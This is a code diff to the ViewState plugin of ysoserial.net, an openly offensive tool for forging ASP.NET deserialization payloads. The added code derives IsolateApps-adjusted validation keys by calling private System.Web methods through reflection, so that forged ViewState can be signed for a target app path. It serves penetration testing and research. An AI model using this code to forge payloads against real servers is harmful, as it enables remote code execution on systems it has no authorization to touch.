@@ -48,6 +48,7 @@ namespace ysoserial.Plugins
 
 
         Assembly systemWebAsm = Assembly.Load("System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a");
+        
         string formatter = "losformatter";
         string payloadString = "";
         string shortestViewStateString = "/wEPZGQ="; // not in use at the moment but good to know!!!
@@ -234,8 +235,46 @@ namespace ysoserial.Plugins
                 // If validationAlg is 3DES, modify it to TripleDES in order for Enum.Parse to work.
                 validationAlg = "TripleDES";
             }
-	    config.Validation = (MachineKeyValidation)Enum.Parse(typeof(MachineKeyValidation), validationAlg);
+            config.Validation = (MachineKeyValidation)Enum.Parse(typeof(MachineKeyValidation), validationAlg);
+
+            if (validationKey.EndsWith(",IsolateApps")) {
+                validationKey = validationKey.Substring(0, validationKey.Length - ",IsolateApps".Length);
+
+                var hexStringToByteArray = typeof(MachineKeySection).GetMethod("HexStringToByteArray", BindingFlags.Static | BindingFlags.NonPublic);
+                byte[] key = (byte[])hexStringToByteArray.Invoke(null, new object[] { validationKey });
+                int dwCode;
+
+                if (isLegacy)
+                {
+
+                    dwCode = (int)StringComparer.InvariantCultureIgnoreCase.GetHashCode("/test233");
+                }
+                else
+                {
+                    var stringUtilType = systemWebAsm.GetType("System.Web.Util.StringUtil");
+                    var nonRandomizedStringComparerHashCodeMethod = stringUtilType.GetMethod("GetNonRandomizedStringComparerHashCode", BindingFlags.Static | BindingFlags.NonPublic);
+                     
+                    dwCode = (int)nonRandomizedStringComparerHashCodeMethod.Invoke(null, new object[] { IISAppInPathOrVirtualDir });
+                }
+
+                key[0] = (byte)(dwCode & 0xff);
+                key[1] = (byte)((dwCode & 0xff00) >> 8);
+                key[2] = (byte)((dwCode & 0xff0000) >> 16);
+                key[3] = (byte)((dwCode & 0xff000000) >> 24);
+                
+                StringBuilder hex = new StringBuilder(key.Length * 2);
+                foreach (byte b in key)
+                    hex.AppendFormat("{0:X2}", b);
+                validationKey = hex.ToString();
+                if (isDebug)
+                {
+                    Console.WriteLine("Calculated new ValidationKey: " + validationKey);
+                }
+
+            }
+
             config.ValidationKey = validationKey;
+
             readOnlyField.SetValue(config, true);
 
             object finalPayload;
